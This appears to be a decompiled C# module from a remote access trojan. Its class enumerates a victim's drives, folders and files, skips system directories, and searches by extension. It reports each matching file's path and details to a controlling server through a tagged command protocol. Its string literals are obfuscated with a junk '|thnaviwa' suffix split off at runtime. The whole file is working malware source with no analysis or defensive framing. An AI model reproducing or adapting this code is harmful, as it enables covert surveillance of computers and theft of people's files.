using System;
using System.Collections.Generic;
using System.IO;

namespace thnaviwa;

internal class DIRINFO
{
	public string thnaviwafilesLogs = CONFIG.thnaviwafilesLogs;

	public int thnaviwafIndx = 0;

	public bool thnaviwareaging = false;

	public MACDM iserver;

	public List<string> thnaviwafExts = new List<string>();

	public List<string> thnaviwanotFilders = new List<string>();

	public string thnaviwamainPath;

	public List<string> thnaviwasFiles = new List<string>();

	public int thnaviwasIndx = 0;

	public string thnaviwalookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|thnaviwa".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public IEnumerable<string> thnaviwaaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.thnaviwaautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (thnaviwaseeAccess(text) && !thnaviwanotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public bool thnaviwaseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public DIRINFO()
	{
		thnaviwanotFilders.Add("clients_data|thnaviwa".Split(new char[1] { '|' })[0]);
		thnaviwanotFilders.Add("program files|thnaviwa".Split(new char[1] { '|' })[0]);
		thnaviwanotFilders.Add("system volume information|thnaviwa".Split(new char[1] { '|' })[0]);
		thnaviwanotFilders.Add("$recycle.bin|thnaviwa".Split(new char[1] { '|' })[0]);
		thnaviwanotFilders.Add("msocache|thnaviwa".Split(new char[1] { '|' })[0]);
		thnaviwanotFilders.Add("recoveDSDF|thnaviwa".Split(new char[1] { '|' })[0]);
		thnaviwanotFilders.Add("documents and settings|thnaviwa".Split(new char[1] { '|' })[0]);
		thnaviwanotFilders.Add("windows|thnaviwa".Split(new char[1] { '|' })[0]);
		thnaviwanotFilders.Add("program files (x86)|thnaviwa".Split(new char[1] { '|' })[0]);
		thnaviwanotFilders.Add("programdata|thnaviwa".Split(new char[1] { '|' })[0]);
	}

	public string thnaviwacheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (thnaviwaseeAccess(text2))
				{
					text = text + text2 + ">|thnaviwa".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void thnaviwasendSearch(string path)
	{
		try
		{
			foreach (string item in thnaviwaaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (thnaviwafExts.Contains(text.ToLower()))
				{
					string text2 = iserver.thnaviwafile_info(item, ret: true);
					iserver.thnaviwapush_data(null, "thnaviwa-searf=|thnaviwa".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|thnaviwa".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.thnaviwaautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public void thnaviwalookFiles(string tempStr)
	{
		iserver.thnaviwaautCnls = false;
		thnaviwafExts.Clear();
		thnaviwasFiles.Clear();
		thnaviwafIndx = 0;
		thnaviwasIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				thnaviwafExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			thnaviwareaging = true;
			thnaviwasendSearch(array[1]);
			thnaviwareaging = false;
			iserver.thnaviwapush_data(null, "thnaviwa-seard=searched|thnaviwa".Split(new char[1] { '|' })[0]);
		}
	}

	public string thnaviwalookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|thnaviwa".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
